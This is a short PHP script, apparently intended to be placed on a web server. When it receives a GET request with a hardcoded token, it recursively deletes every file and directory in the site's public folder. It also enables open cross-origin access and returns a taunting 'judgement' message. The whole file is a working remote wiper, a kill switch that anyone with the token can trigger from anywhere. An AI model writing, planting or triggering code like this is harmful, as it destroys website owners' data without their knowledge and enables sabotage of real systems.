<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

$validToken = 'ReaperOAK'; // Replace with your actual secret token

if (!isset($_GET['token']) || $_GET['token'] !== $validToken) {
    die(json_encode(["error" => "Invalid token"]));
}

function deleteFiles($dir) {
    if (!is_dir($dir)) {
        return;
    }

    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $filePath = "$dir/$file";
        if (is_dir($filePath)) {
            deleteFiles($filePath);
            rmdir($filePath);
        } else {
            unlink($filePath);
        }
    }
}

$publicDir = realpath(__DIR__ . '/../'); // Adjust the path to your public directory
deleteFiles($publicDir);

echo json_encode(["success" => "ReaperOAK's judgement"]);
?>